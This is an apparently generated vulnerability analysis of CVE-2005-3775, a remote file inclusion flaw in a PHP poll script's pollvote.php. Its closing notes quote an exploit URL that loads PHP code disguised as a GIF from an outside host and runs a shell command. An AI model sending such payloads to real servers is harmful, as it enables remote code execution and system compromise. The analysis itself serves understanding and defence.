Based on the provided content, here's an analysis of CVE-2005-3775:

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) vulnerability in the `pollvote.php` script. This occurs because the `pollname` parameter in the script is not properly sanitized, allowing an attacker to include a remote file.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion:** The primary vulnerability is the ability to include and execute arbitrary code from a remote server. This is due to insufficient input validation of the `pollname` parameter.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** An attacker can achieve arbitrary code execution on the vulnerable server by including a malicious file (e.g., a PHP script) from a remote location.
- **System Compromise:** Successful exploitation could lead to full system compromise, data theft, and other malicious activities.

**Attack Vectors:**
- **HTTP GET Request:** The attack vector is through a crafted HTTP GET request, where the `pollname` parameter is manipulated to point to a remote malicious file.
- **URL Parameter Manipulation:** Attackers can use URL parameters to inject the malicious URL.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker requires network access to the vulnerable server.
- **Ability to Host a Malicious File:** The attacker must have a remote server where they can host a malicious file, which will be included by the vulnerable script.
- **Knowledge of Vulnerable Script:** The attacker needs to know the path to `pollvote.php` and the exploitable parameter, `pollname`.

**Additional Notes:**
- The provided exploit example shows how the vulnerability can be exploited: `http://[host].com/[path]/pollvote.php?pollname=http://www.[host].com/CMD.gif?&cmd=ls`
- The attacker is attempting to include a GIF file, which they have manipulated with PHP code. The `cmd=ls` part is likely to perform a command injection to execute an arbitrary command if the php interpreter renders the injected php code.
